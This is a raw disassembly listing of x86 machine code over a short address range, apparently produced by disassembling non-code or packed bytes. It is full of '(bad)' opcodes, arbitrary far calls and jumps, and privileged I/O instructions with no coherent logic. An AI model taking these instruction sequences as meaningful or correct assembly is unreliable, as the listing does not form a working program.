  4225ac:	and    bl,BYTE PTR [edx+eiz*1+0x48]
  4225b0:	xchg   esi,eax
  4225b1:	dec    edi
  4225b2:	popf   
  4225b3:	(bad)  
  4225b4:	std    
  4225b5:	mov    cl,0xe7
  4225b7:	mov    dl,0x13
  4225b9:	inc    ebp
  4225ba:	lods   eax,DWORD PTR ds:[esi]
  4225bb:	div    eax
  4225bd:	shl    cl,cl
  4225bf:	cmp    BYTE PTR [ebx],dl
  4225c1:	in     al,0x4c
  4225c3:	jno    0x422551
  4225c5:	ror    DWORD PTR [ebp+0x1a],cl
  4225c8:	cwde   
  4225c9:	push   cs
  4225ca:	popf   
  4225cb:	push   ebp
  4225cc:	inc    ecx
  4225cd:	pop    ecx
	...
  4225da:	leave  
  4225db:	xchg   esi,eax
  4225dc:	ins    DWORD PTR es:[edi],dx
  4225dd:	mov    dh,0x7f
  4225df:	(bad)  
  4225e0:	(bad)  
  4225e2:	out    0x3f,al
  4225e4:	nop
  4225e5:	sbb    eax,DWORD PTR [edi]
  4225e7:	ja     0x4225a4
  4225e9:	lock int3 
  4225eb:	mov    al,ds:0x1fc0001
  4225f0:	add    BYTE PTR [eax],al
  4225f2:	into   
  4225f3:	mov    ecx,eax
  4225f5:	stos   DWORD PTR es:[edi],eax
  4225f6:	adc    bl,ch
  4225f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225f9:	jmp    edx
  4225fb:	inc    esi
  4225fc:	mov    dl,0x15
  4225fe:	cs pushf 
  422600:	push   ecx
  422601:	popf   
  422602:	ja     0x4225b1
  422604:	xchg   al,cl
  422606:	aas    
  422607:	ins    DWORD PTR es:[edi],dx
  422608:	pop    ebp
  422609:	fimul  WORD PTR [edx+0x332cd8d8]
  42260f:	rcr    al,0xc3
  422612:	rcl    BYTE PTR [edi],1
  422614:	jle    0x4225ae
  422616:	retf   0xf867
  422619:	and    dh,ch
  42261b:	gs cs pop es
  42261e:	rol    BYTE PTR [ecx+0x20b4309a],1
  422624:	scas   eax,DWORD PTR es:[edi]
  422625:	call   0xac97:0x979aea8a
  42262c:	or     al,0xa1
  42262e:	test   eax,0x1274adf4
  422633:	test   BYTE PTR [edx],0x45
  422636:	lea    sp,[edx+0x73020925]
  42263d:	dec    ecx
  42263e:	pop    eax
  42263f:	lods   eax,DWORD PTR ds:[esi]
  422640:	retf   
  422641:	jne    0x42269c
  422643:	sub    DWORD PTR [eax+0x18638449],edx
  422649:	mov    dh,0x27
  42264b:	inc    eax
  42264c:	cmp    BYTE PTR [edx],al
  42264e:	ins    DWORD PTR es:[edi],dx
  42264f:	fimul  DWORD PTR [eax]
  422651:	(bad)  
  422652:	xor    DWORD PTR [ebp-0x565ea67d],esp
  422658:	and    ecx,DWORD PTR [ecx]
  42265a:	popa   
  42265b:	xor    DWORD PTR [ebp+0x41fd8766],ecx
  422661:	push   esi
  422662:	imul   ecx,esp,0x73
  422665:	ficomp DWORD PTR [edx+0xe]
  422668:	shr    DWORD PTR [edx+0x12cca5ba],0xb8
  42266f:	pop    ecx
  422670:	retf   
  422671:	int3   
  422672:	and    dl,al
  422674:	loopne 0x4226b4
  422676:	cmp    dl,BYTE PTR [esi]
  422678:	jae    0x42268b
  42267a:	aad    0xf
  42267c:	mov    edx,0xa53e3176
  422681:	int3   
  422682:	(bad)  
  422683:	xchg   edi,eax
  422684:	sar    DWORD PTR [edi-0x6f],1
  422687:	mov    DWORD PTR [ebx-0x26],0xd3848824
  42268e:	(bad)  
  42268f:	aam    0xb8
  422691:	or     DWORD PTR [ebx],edi
  422693:	mov    edx,0xc54564a0
  422699:	not    BYTE PTR [ebx-0x558571f0]
  42269f:	lock ins DWORD PTR es:[edi],dx
  4226a1:	(bad)
  4226a4:	xor    BYTE PTR fs:[ecx+0x175b2237],dl
  4226ab:	call   0x5cb1:0x2840a356
  4226b2:	fnstenv [ebp+0x56]
  4226b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226b6:	push   edx
  4226b7:	add    eax,0x439bd8ba
  4226bc:	push   ecx
  4226bd:	ficom  WORD PTR [ecx-0x8e88c97]
  4226c3:	sti    
  4226c4:	cdq    
  4226c5:	(bad)  
  4226c6:	or     dh,BYTE PTR [ebx+0x219a0f04]
  4226cc:	fwait
  4226cd:	sbb    eax,0xf6449350
  4226d2:	jp     0x4226ac
  4226d4:	(bad)  
  4226d5:	or     BYTE PTR [ebx],bl
  4226d7:	cmp    ch,ch
  4226d9:	mov    ecx,0xb8c44d21
  4226de:	push   0xa2abde4f
  4226e3:	stc    
  4226e4:	fnsave [ecx-0x8]
  4226e7:	pop    edx
  4226e8:	xor    DWORD PTR [ecx+0x71],ebx
  4226eb:	imul   esp,DWORD PTR ds:0xbde56736,0xffffffb6
  4226f2:	test   BYTE PTR ds:0x8ae2ad69,bl
  4226f8:	scas   eax,DWORD PTR es:[edi]
  4226f9:	das    
  4226fa:	movhps xmm0,QWORD PTR [eax-0x66]
  4226fe:	and    bh,BYTE PTR [ecx]
  422700:	loopne 0x4226aa
  422702:	inc    eax
  422703:	pop    edi
  422704:	sbb    cl,cl
  422706:	adc    ch,cl
  422708:	sub    dh,BYTE PTR [edi-0x3a]
  42270b:	sub    BYTE PTR [esi],ch
  42270d:	adc    DWORD PTR [esi+esi*2+0x2a4b2a8],eax
  422714:	xor    dh,ch
  422716:	fs mov dl,0x19
  422719:	cmp    ebp,ebp
  42271b:	push   ebx
  42271c:	inc    eax
  42271d:	or     ch,BYTE PTR ds:[edx-0x73]
  422721:	shr    BYTE PTR [ebx-0x26f37fd0],1
  422727:	mov    eax,0x88b455c0
  42272c:	mov    dh,0xd0
  42272e:	out    0xcb,eax
  422730:	daa    
  422731:	xchg   DWORD PTR [edx-0x2bd02e41],edx
  422737:	icebp  
  422738:	(bad)  
  422739:	out    0x19,al
  42273b:	dec    edx
  42273c:	ss hlt 
  42273e:	pushf  
  42273f:	xor    bl,BYTE PTR [eax+0x4a66603d]
  422745:	aad    0x2
  422747:	pushf  
  422748:	xchg   ecx,ecx
  42274a:	fs jl  0x4226f4
  42274d:	jns    0x42272b
  42274f:	imul   esi,DWORD PTR [ecx+0x195ae329],0x1575898b
  422759:	stos   DWORD PTR es:[edi],eax
  42275a:	pop    ds
  42275b:	fmul   QWORD PTR [edi+0x5e]
  42275e:	popf   
  42275f:	ja     0x42273d
  422761:	daa    
  422762:	retf   0x5b26
  422765:	xor    cl,BYTE PTR [esi-0xd9cf672]
  42276b:	or     al,dh
  42276d:	push   edx
  42276e:	xchg   ecx,eax
  42276f:	shl    al,1
  422771:	repz (bad) 
  422773:	pop    esp
  422774:	icebp  
  422775:	push   ecx
  422776:	sub    al,0x94
  422778:	stc    
  422779:	aaa    
  42277a:	int    0xe9
  42277c:	xor    ebp,0xb14ce829
  422782:	add    DWORD PTR [ebp+0xa],esp
  422785:	dec    esi
  422786:	adc    eax,0x557bb6b1
  42278b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42278c:	aad    0xa9
  42278e:	maskmovq mm1,(bad)
  42278f:	test   DWORD PTR [edx+0x37fdf294],0x803d9eee
  422799:	inc    edi
  42279a:	les    edx,FWORD PTR [ebx+eax*1-0x12e73176]
  4227a1:	mov    ch,BYTE PTR [ecx-0x64]
  4227a4:	sub    DWORD PTR [esi-0x78],0x3c
  4227a8:	arpl   bp,bx
  4227aa:	(bad)  
  4227ab:	ds pop eax
  4227ad:	inc    esi
  4227ae:	(bad)  
  4227b0:	jne    0x4227cd
  4227b2:	icebp  
  4227b3:	fcmovb st,st(7)
  4227b5:	neg    BYTE PTR [edi]
  4227b7:	or     BYTE PTR [edx+esi*2+0x2d70c8b9],0x38
  4227bf:	sbb    eax,0x301608fe
  4227c4:	jle    0x4227d7
  4227c6:	dec    ebp
  4227c7:	sbb    al,0x8c
  4227c9:	int3   
  4227ca:	aam    0xea
  4227cc:	xchg   BYTE PTR [eax-0x2e4aaf3a],ah
  4227d2:	sub    eax,0x533ec9fd
  4227d7:	arpl   sp,ax
  4227d9:	ins    BYTE PTR es:[edi],dx
  4227da:	xor    bl,0xee
  4227dd:	les    eax,FWORD PTR [edi-0x5b]
  4227e0:	xor    BYTE PTR [ebx],bh
  4227e2:	dec    eax
  4227e3:	je     0x42283b
  4227e5:	inc    eax
  4227e6:	jg     0x4227bb
  4227e8:	das    
  4227e9:	inc    ebx
  4227ea:	ja     0x422788
  4227ec:	and    al,0xb3
	...
  4227fa:	dec    eax
  4227fb:	out    dx,eax
  4227fc:	ja     0x422869
  4227fe:	idiv   ebx
  422800:	pop    esp
  422801:	out    dx,eax
  422802:	cmp    DWORD PTR [ecx+0x4b97e210],ebx
  422808:	mov    ds:0x1a2c800,al
  42280d:	add    ah,bh
  42280f:	add    DWORD PTR [eax],eax
  422811:	add    BYTE PTR ds:0xf59c1b1b,dl
  422817:	cmc    
  422818:	fld    st(3)
  42281a:	sbb    bl,BYTE PTR [esi-0xd]
  42281d:	push   edx
  42281e:	(bad)
  422823:	inc    eax
  422824:	loop   0x42286b
  422826:	arpl   WORD PTR [edi+ecx*1+0x76],ax
  42282a:	jl     0x42289f
  42282c:	or     al,0x6d
  42282e:	mov    DWORD PTR [esi],edi
  422830:	js     0x422873
  422832:	call   0x5ccf:0x777ae3af
  422839:	je     0x4228a0
  42283b:	in     eax,dx
  42283c:	adc    ecx,0x67
  42283f:	xor    eax,0xd48f3e2f
  422844:	xchg   ebx,eax
  422845:	mov    esp,DWORD PTR [eax+ebp*1]
  422848:	mov    al,0x5f
  42284a:	pop    esp
  42284b:	in     al,dx
  42284c:	lock ss dec ecx
  42284f:	jno    0x422881
  422851:	sub    ecx,edi
  422853:	imul   ecx,DWORD PTR [edi+0x8],0xd
  422857:	fidivr DWORD PTR [ecx+0x42b7b101]
  42285d:	jne    0x422841
  42285f:	mov    WORD PTR [ebx+eax*8],cs
  422862:	xor    eax,0xd09efde9
  422867:	sub    al,bh
  422869:	inc    eax
  42286a:	addr16 mov ds:0xc398,al
  42286e:	xor    DWORD PTR [ebp+0x4f4a801a],edx
  422874:	pop    ds
  422875:	repnz mov bl,0x36
  422878:	inc    ebx
  422879:	pop    es
  42287a:	add    eax,0xa7ee84b0
  42287f:	jb     0x42282f
  422881:	jl     0x422877
  422883:	in     eax,0xa7
  422885:	cmc    
  422886:	les    esp,FWORD PTR [eax+0x289178ba]
  42288c:	pop    ebp
  42288d:	and    dl,BYTE PTR [edx+0x60919def]
  422893:	in     al,0x9e
  422895:	cmp    al,0xc6
  422897:	frstor [eax-0x60]
  42289a:	(bad)  
  42289b:	mov    ecx,DWORD PTR [edx]
  42289d:	sub    esi,ebx
  42289f:	les    ecx,FWORD PTR [ebp-0x45]
  4228a2:	pop    esp
  4228a3:	pop    es
  4228a4:	adc    al,0xe2
  4228a6:	seta   BYTE PTR [eax+0x55]
  4228aa:	xor    ch,cl
  4228ac:	pop    edi
  4228ad:	jnp    0x422840
  4228af:	call   0xca31:0xfddfa370
  4228b6:	fistp  QWORD PTR [ecx+0x54]
  4228b9:	hlt    
  4228ba:	and    ebx,0x10
  4228bd:	sub    bh,bh
  4228bf:	add    bh,BYTE PTR [ebx+0x1f6ef78]
  4228c5:	(bad)  
  4228c6:	les    esi,FWORD PTR [esi+0x2ab86057]
  4228cc:	ins    BYTE PTR es:[edi],dx
  4228cd:	mov    eax,ds:0xbd07231c
  4228d2:	xor    al,0xb8
  4228d4:	adc    dh,BYTE PTR [ecx]
  4228d6:	sub    dl,BYTE PTR [edi+0x1c]
  4228d9:	arpl   WORD PTR [esi],si
  4228db:	fs dec ebp
  4228dd:	fs pusha 
  4228df:	xor    al,0x7a
  4228e1:	outs   dx,DWORD PTR ds:[esi]
  4228e2:	xchg   ebx,eax
  4228e3:	into   
  4228e4:	fdiv   DWORD PTR [ecx+0x5d]
  4228e7:	mov    cl,0xd6
  4228e9:	test   DWORD PTR [esi+eiz*8-0xd],eax
  4228ed:	sbb    eax,DWORD PTR [esi+0x57e876c3]
  4228f3:	jge    0x422911
  4228f5:	sbb    eax,0xafcd2297
  4228fa:	loopne 0x422921
  4228fc:	rol    DWORD PTR [ebx+0x6d],0x46
  422900:	lea    edi,[ebp-0x318728b4]
  422906:	lea    ebp,[eax+0x3028f6d7]
  42290c:	mov    al,ds:0x61937df2
  422911:	out    0xa7,eax
  422913:	fdiv   QWORD PTR [ebx+edi*2-0x5]
  422917:	xlat   BYTE PTR ds:[ebx]
  422918:	dec    ecx
  422919:	mov    bh,BYTE PTR [edi+0x19feb5fb]
  42291f:	fs adc al,0x6
  422922:	rep lods eax,DWORD PTR ds:[esi]
  422924:	sbb    BYTE PTR ds:0x355d2a5e,dh
  42292a:	sbb    BYTE PTR [esi-0x196d05a8],ch
  422930:	arpl   WORD PTR [esi],sp
  422932:	popa   
  422933:	xor    dl,BYTE PTR [ebx+edi*8]
  422936:	out    dx,eax
  422937:	outs   dx,BYTE PTR ds:[esi]
  422938:	test   eax,0xec6b49c3
  42293d:	pop    es
  42293e:	popf   
  42293f:	(bad)  
  422940:	mov    al,0x7f
  422942:	int    0x3a
  422944:	sub    BYTE PTR [esi-0x4d],bl
  422947:	inc    ecx
  422948:	xor    cl,BYTE PTR [edx-0x15a3c516]
  42294e:	stos   DWORD PTR es:[edi],eax
  42294f:	sbb    al,0x89
  422951:	push   esi
  422952:	imul   ebx,DWORD PTR [edi+ebx*1-0x2d7086c2],0x41
  42295a:	lock lahf 
  42295c:	sar    dh,1
  42295e:	test   al,0xe4
  422960:	pop    ss
  422961:	pop    es
  422962:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422963:	jbe    0x4229a9
  422965:	pop    es
  422966:	cmp    BYTE PTR [edi+edi*2+0x54147a75],bl
  42296d:	dec    esp
  42296e:	mov    ah,0x8b
  422970:	enter  0xbeb5,0x9c
  422974:	shr    BYTE PTR [ecx],1
  422976:	jge    0x4229b1
  422978:	rol    DWORD PTR [eax+ebx*1-0x4f],0x8c
  42297d:	mov    esp,0xe382d159
  422982:	ins    DWORD PTR es:[edi],dx
  422983:	inc    esi
  422984:	mov    ch,cl
  422986:	imul   ebp,DWORD PTR [ecx],0x6adcc6ce
  42298c:	jmp    0x42299e
  42298e:	adc    al,0x24
  422990:	add    BYTE PTR [edi-0x39bbcf5e],0xd8
  422997:	mov    ?,WORD PTR [ecx+0x487bb36]
  42299d:	jae    0x422a14
  42299f:	jbe    0x4229d7
  4229a1:	arpl   WORD PTR [eax+0x57],dx
  4229a4:	adc    eax,0x724be10b
  4229a9:	or     eax,0x456f1e5c
  4229ae:	add    dl,0x45
  4229b1:	aaa    
  4229b2:	mov    ch,0x83
  4229b4:	imul   eax,esi,0xb
  4229b7:	or     BYTE PTR [edx+0x7277cd7a],al
  4229bd:	jmp    0x42295c
  4229bf:	in     al,dx
  4229c0:	jb     0x4229af
  4229c2:	outs   dx,BYTE PTR ds:[esi]
  4229c3:	jg     0x4229d2
  4229c5:	lods   eax,DWORD PTR ds:[esi]
  4229c6:	shr    DWORD PTR [esi+0x0],cl
  4229c9:	cli    
  4229ca:	xchg   DWORD PTR [edx-0x2c],esi
  4229cd:	xor    al,0xe8
  4229cf:	dec    ebp
  4229d0:	retf   0xfbb5
  4229d3:	shr    BYTE PTR [edx+0x35961ca],cl
  4229d9:	xor    bl,dh
  4229db:	fwait
  4229dc:	add    eax,0x9e2e4c38
  4229e1:	adc    al,0x9d
  4229e3:	retf   
  4229e4:	(bad)  
  4229e5:	jns    0x42297b
  4229e7:	add    ebp,edx
  4229e9:	je     0x422994
  4229eb:	mov    esp,0x33258ba2
  4229f0:	in     eax,0xad
  4229f2:	mov    ecx,0x77d1ecbf
  4229f7:	dec    ebx
  4229f9:	lods   eax,DWORD PTR ds:[esi]
  4229fa:	mov    eax,0x52de9e4c
  4229ff:	add    al,0x7b
  422a01:	test   ebp,ecx
  422a03:	jno    0x4229fb
  422a05:	push   0xffffff9d
  422a07:	cmc    
  422a08:	xchg   esi,eax
  422a09:	popa   
  422a0a:	ins    BYTE PTR es:[edi],dx
  422a0b:	cwde   
  422a0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a0d:	add    eax,DWORD PTR [eax]
	...
  422a17:	add    BYTE PTR [eax],al
  422a19:	add    BYTE PTR [eax+0x5be35ae3],dh
  422a1f:	sti    
  422a20:	mov    ecx,0xeb2b3af3
  422a25:	inc    ecx
  422a26:	fild   DWORD PTR [edx]
  422a28:	imul   esp,DWORD PTR [edx+0x1a4c4],0xfffffffc
  422a2f:	add    DWORD PTR [eax],eax
  422a31:	add    BYTE PTR [ebp+0xc],al
  422a34:	push   esi
  422a35:	stos   DWORD PTR es:[edi],eax
  422a36:	mov    edi,0xa1de8081
  422a3b:	xchg   esp,eax
  422a3c:	cmp    eax,edi
  422a3e:	add    eax,0x28f4f6de
  422a43:	add    al,BYTE PTR [edx-0x578efba0]
  422a49:	xor    eax,esp
  422a4b:	mov    al,ds:0x44d77633
  422a50:	sbb    cl,BYTE PTR [ecx+0x1]
  422a53:	add    ch,ah
  422a55:	sub    dh,BYTE PTR [esi]
  422a57:	add    ebp,esp
  422a59:	push   ds
  422a5a:	rcr    DWORD PTR [edx-0x70],1
  422a5d:	add    ah,ah
  422a5f:	clc    
  422a60:	mov    esp,0x56ae6eb4
  422a65:	adc    eax,0xa30d0a78
  422a6a:	mov    ecx,0x6acfe
  422a6f:	mov    al,ds:0x1dd8e92d
  422a74:	adc    BYTE PTR [ebp-0x4b],ah
  422a77:	mov    ?,ebx
  422a79:	fwait
  422a7a:	test   al,0xd1
  422a7c:	pop    edi
  422a7d:	ins    BYTE PTR es:[edi],dx
  422a7e:	xor    BYTE PTR [ebp+0x1523dc1b],bl
  422a84:	cmp    eax,0xb8cc76e8
  422a89:	outs   dx,BYTE PTR ds:[esi]
  422a8a:	adc    ebx,edi
  422a8c:	mov    edx,0x5de3b82d
  422a91:	pop    esp
  422a92:	(bad)  
  422a93:	ins    DWORD PTR es:[edi],dx
  422a94:	add    edx,DWORD PTR [ebx+0x48]
  422a97:	push   esp
  422a98:	call   0x7391:0x9093a8fc
  422a9f:	mov    bl,0xd
  422aa1:	or     DWORD PTR [eax-0x6460c51d],ebp
  422aa7:	xchg   al,ch
  422aa9:	mov    esi,0x67d5c8fa
  422aae:	enter  0xc0dc,0xf4
  422ab2:	ret    0x4725
  422ab5:	adc    dl,0x93
  422ab8:	push   edi
  422ab9:	bound  ebx,QWORD PTR [ecx-0x16169885]
  422abf:	out    dx,al
  422ac0:	or     esi,DWORD PTR [edi+0x3dec4cd2]
  422ac6:	inc    esi
  422ac7:	lds    esp,FWORD PTR [ecx]
  422ac9:	xor    eax,0x654fadb8
  422ace:	mov    ah,0xed
  422ad0:	pushf  
  422ad1:	dec    edi
  422ad2:	pop    esp
  422ad3:	cmc    
  422ad4:	imul   esp,ebp,0x1ab8c801
  422ada:	rcl    edi,1
  422adc:	inc    edx
  422add:	clc    
  422ade:	test   DWORD PTR [ebx+0x2ff43090],edi
  422ae4:	sahf   
  422ae5:	enter  0xc4bd,0x62
  422ae9:	add    DWORD PTR [edx],0x9b189f17
  422aef:	lahf   
  422af0:	cmp    eax,0xe88beea2
  422af5:	es out 0x86,al
  422af8:	les    ecx,FWORD PTR [esi-0x40]
  422afb:	fadd   DWORD PTR [eax-0x23]
  422afe:	push   edx
  422aff:	leave  
  422b00:	not    esp
  422b02:	sub    DWORD PTR [ebp+0x14],ebx
  422b05:	call   0xff51:0xd1c3d63b
  422b0c:	push   es
  422b0d:	xor    dl,BYTE PTR [esi+0x452ccbe6]
  422b13:	jle    0x422ab7
  422b15:	adc    BYTE PTR [ebp-0x442f9f84],ch
  422b1b:	xchg   esi,eax
  422b1c:	adc    DWORD PTR [ebx],esp
  422b1e:	sbb    ebx,DWORD PTR [ecx+0x39a5009c]
  422b24:	sti    
  422b25:	inc    eax
  422b26:	scas   al,BYTE PTR es:[edi]
  422b27:	push   edx
  422b28:	adc    eax,0x6ce4a781
  422b2d:	xor    esi,DWORD PTR [edx-0x3469c3d6]
  422b33:	aad    0x86
  422b35:	arpl   WORD PTR [ebp+0x5],bx
  422b38:	daa    
  422b39:	rcr    BYTE PTR [esi+0x5e3a09cd],cl
  422b3f:	outs   dx,DWORD PTR ds:[esi]
  422b40:	mov    ebp,0x251e6828
  422b45:	pop    DWORD PTR [edx+0x664134bd]
  422b4b:	push   edx
  422b4c:	push   eax
  422b4d:	dec    edx
  422b4e:	(bad)  
  422b4f:	mov    ebp,0x5cca3dae
  422b54:	pusha  
  422b55:	stos   BYTE PTR es:[edi],al
  422b56:	test   BYTE PTR [ebx+0x20d4a225],al
  422b5c:	inc    ebx
  422b5d:	bound  ecx,QWORD PTR [esp+ebp*4]
  422b60:	sub    al,0xfb
  422b62:	fcomip st,st(7)
  422b64:	cmp    dl,BYTE PTR [edi+0x4998d11a]
  422b6a:	adc    BYTE PTR ds:0x4a2a1023,dl
  422b70:	sti    
  422b71:	mov    bh,bl
  422b73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b74:	leave  
  422b75:	out    0x59,eax
  422b77:	jne    0x422b57
  422b79:	sbb    esp,DWORD PTR [ebx]
  422b7b:	sub    eax,0x6e7c764c
  422b80:	add    al,0xb5
  422b82:	sub    DWORD PTR [ecx],esi
  422b84:	inc    esp
  422b85:	pop    ebp
  422b86:	xchg   ebp,eax
  422b87:	adc    bh,bl
  422b89:	mov    esi,0xe2c07b4d
  422b8e:	pop    ss
  422b8f:	xchg   edi,eax
  422b90:	xor    DWORD PTR [esi],esi
  422b92:	xor    cl,BYTE PTR [eax+0x67cb8ce4]
  422b98:	add    al,0xa3
  422b9a:	push   esi
  422b9b:	dec    ebx
  422b9c:	or     eax,0xc8b160ee
  422ba1:	jp     0x422bea
  422ba3:	jb     0x422b4e
  422ba5:	jecxz  0x422b3e
  422ba7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ba8:	out    0x24,eax
  422baa:	sti    
  422bab:	aam    0xa4
  422bad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422bae:	(bad)  
  422baf:	or     eax,0x9ac9176a
  422bb5:	lds    ecx,FWORD PTR [edi+0x7a2b921e]
  422bbb:	xchg   edi,eax
  422bbc:	in     al,0x91
  422bbe:	push   ss
  422bbf:	retf   
  422bc0:	stc    
  422bc1:	lods   al,BYTE PTR ds:[esi]
  422bc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422bc3:	cmp    BYTE PTR [ebx+esi*4],0x37
  422bc7:	aaa    
  422bc8:	fldcw  WORD PTR [edx+eiz*1]
  422bcb:	in     eax,0xe3
  422bcd:	pop    esi
  422bce:	pop    eax
  422bcf:	xor    BYTE PTR [ebx-0x3f],al
  422bd2:	or     esi,DWORD PTR [eax-0x74]
  422bd5:	outs   dx,DWORD PTR ds:[esi]
  422bd6:	mov    bh,0xcf
  422bd8:	stos   DWORD PTR es:[edi],eax
  422bd9:	retf   0x1d8b
  422bdc:	adc    bl,BYTE PTR [eax-0x58536d39]
  422be2:	stos   BYTE PTR es:[edi],al
  422be3:	ja     0x422bbd
  422be5:	pop    es
  422be6:	cmp    cl,BYTE PTR [ebx-0x4a]
  422be9:	fld1   
  422beb:	inc    edx
  422bec:	leave  
  422bed:	sub    eax,0xf1021e23
  422bf2:	push   ebp
  422bf3:	dec    ebp
  422bf4:	fstenv [edi+0x6505b9e9]
  422bfb:	mov    dh,0x13
  422bfd:	jns    0x422c5e
  422bff:	xlat   BYTE PTR ds:[ebx]
  422c00:	mov    edi,0x6307a14c
  422c05:	push   edx
  422c06:	sbb    eax,0xfc390e8f
  422c0b:	or     cl,al
  422c0d:	jmp    0x501f:0x23bdd9f6
  422c14:	stos   BYTE PTR es:[edi],al
  422c15:	(bad)  
  422c16:	std    
  422c17:	ficom  DWORD PTR [esi]
  422c19:	add    DWORD PTR [edi],esi
  422c1b:	jmp    DWORD PTR [esi-0x141a7f0f]
  422c21:	sub    ch,BYTE PTR [eax+0x3]
  422c24:	mov    bh,0x38
  422c26:	ds jmp 0x56dd2796
  422c2c:	push   ds
  422c2d:	mov    ebp,0x0
	...
  422c3a:	xor    eax,0xbf06168e
  422c3f:	sahf   
  422c40:	xor    eax,0x913f27bf
  422c45:	sub    edx,DWORD PTR [ebx+esi*2-0x26]
  422c49:	pop    ebp
  422c4a:	shl    BYTE PTR [esi+0x1fc0001],0x0
  422c51:	add    ah,bh
  422c53:	sub    bl,BYTE PTR [ecx]
  422c55:	cmp    eax,0x182edca0
  422c5a:	out    0x36,eax
  422c5c:	xchg   edx,eax
  422c5d:	or     ebx,DWORD PTR [ebp-0x789f0ba3]
  422c63:	mov    ds:0x6c8658a3,eax
  422c68:	sbb    al,ah
  422c6a:	icebp  
  422c6b:	loope  0x422c84
  422c6d:	aaa    
  422c6e:	and    al,ah
  422c70:	sbb    DWORD PTR [ebx],0x5ae388e7
  422c76:	and    bh,dh
  422c78:	push   ebp
  422c79:	inc    ah
  422c7b:	xchg   esi,eax
  422c7c:	xchg   BYTE PTR [ebx+0x120eb727],bl
  422c82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c83:	add    ebp,eax
  422c85:	into   
  422c86:	in     al,0x41
  422c88:	dec    eax
  422c89:	and    ebx,DWORD PTR [esi-0x1132bcb9]
  422c8f:	jb     0x422cd6
  422c91:	mov    edi,DWORD PTR ds:0x497a2321
  422c97:	retf   0x433a
  422c9a:	and    eax,0x9316e7f8
  422c9f:	jnp    0x422cd3
  422ca1:	pop    esp
  422ca2:	mov    edx,0xe1508bb7
  422ca7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ca8:	mov    al,ds:0x26303096
  422cad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422cae:	cmp    esp,DWORD PTR [edx+0x2e95d99c]
  422cb4:	pop    ss
  422cb5:	lods   al,BYTE PTR ds:[esi]
  422cb6:	jb     0x422ca2
  422cb8:	mov    edi,0x792aaf2b
  422cbd:	mov    WORD PTR [eax+edx*2],cs
  422cc0:	add    BYTE PTR [esi+0x16],0xcb
  422cc4:	aad    0xeb
  422cc6:	xor    ecx,0x44
  422cc9:	mov    dh,0x57
  422ccb:	sub    eax,0xb359969f
  422cd0:	dec    ebp
  422cd1:	stos   BYTE PTR es:[edi],al
  422cd2:	popf   
  422cd3:	sub    ah,BYTE PTR [esi-0x3d7ab81c]
  422cd9:	je     0x422cbe
  422cdb:	pop    ecx
  422cdc:	xor    al,0x3a
  422cde:	in     eax,dx
  422cdf:	test   ebx,esp
  422ce1:	pushf  
  422ce2:	pop    edi
  422ce3:	data16 (bad) 
  422ce5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ce6:	js     0x422cb2
  422ce8:	push   edx
  422ce9:	es dec ecx
  422ceb:	repz or DWORD PTR [edx+0x6effb9e8],esp
  422cf2:	sbb    DWORD PTR [edx+ebx*2+0x4b],edx
  422cf6:	arpl   di,di
  422cf8:	pop    ebx
  422cf9:	and    dl,bh
  422cfb:	inc    DWORD PTR [eax]
  422cfd:	push   cs
  422cfe:	ins    BYTE PTR es:[edi],dx
  422cff:	test   DWORD PTR [ebp-0xe],0x48a40a84
  422d06:	mov    BYTE PTR [ecx-0x5d86b252],dl
  422d0c:	mov    dl,BYTE PTR [ebp+0x67]
  422d0f:	retf   0xea7c
  422d12:	jg     0x422d54
  422d14:	adc    esi,DWORD PTR fs:[ecx]
  422d17:	aas    
  422d18:	ds push eax
  422d1a:	imul   ebx
  422d1c:	jbe    0x422d94
  422d1e:	push   0xffffffb4
  422d20:	push   ebp
  422d21:	mov    eax,0xffd5e5e8
  422d26:	sub    DWORD PTR [edx],esi
  422d28:	pop    eax
  422d29:	push   ds
  422d2a:	popf   
  422d2b:	daa    
  422d2c:	aaa    
  422d2d:	(bad)
  422d32:	and    esp,ecx
  422d34:	mov    esi,0x9b873364
  422d39:	push   esp
  422d3a:	mov    ds:0x59b4f7cc,eax
  422d3f:	adc    ebp,DWORD PTR ds:0xf825a2d7
  422d45:	div    BYTE PTR [ecx]
  422d47:	scas   al,BYTE PTR es:[edi]
  422d48:	mul    BYTE PTR [ebp+0x52588d13]
  422d4e:	xor    bl,BYTE PTR [eax+0x1]
  422d51:	scas   al,BYTE PTR es:[edi]
  422d52:	push   ss
  422d53:	dec    esi
  422d54:	pop    es
  422d55:	fimul  WORD PTR [ebx]
  422d57:	cli    
  422d58:	leave  
  422d59:	sbb    BYTE PTR [ebp-0x11],bl
  422d5c:	loopne 0x422dac
  422d5e:	pusha  
  422d5f:	inc    esi
  422d60:	call   0xda93:0x60af6ddc
  422d67:	xor    eax,DWORD PTR [ecx-0x64c12bec]
  422d6d:	sub    al,0x71
  422d6f:	xchg   ebp,eax
  422d70:	mov    esi,0x380ac3aa
  422d75:	test   DWORD PTR [ebp+esi*2+0x7f],edi
  422d79:	adc    BYTE PTR [edi+0x35],dh
  422d7c:	fnsave [esi-0x6]
  422d7f:	popf   
  422d80:	jmp    0xd86f:0x32de0299
  422d87:	pop    ss
  422d88:	das    
  422d89:	ja     0x422d23
  422d8b:	sbb    esp,esi
  422d8d:	mov    ah,0x5f
  422d8f:	call   0xa5d50fb2
  422d94:	scas   eax,DWORD PTR es:[edi]
  422d95:	push   eax
  422d96:	mov    ch,dl
  422d98:	fdivr  DWORD PTR [ecx+0x1b]
  422d9b:	mov    BYTE PTR [esi],bl
  422d9d:	cmc    
  422d9e:	data16 xor BYTE PTR [eax],dl
  422da1:	cdq    
  422da2:	adc    DWORD PTR [edx+0x21142afe],0xc2d84a73
  422dac:	xor    eax,0xa74c312f
  422db1:	pop    esp
  422db2:	je     0x422dc9
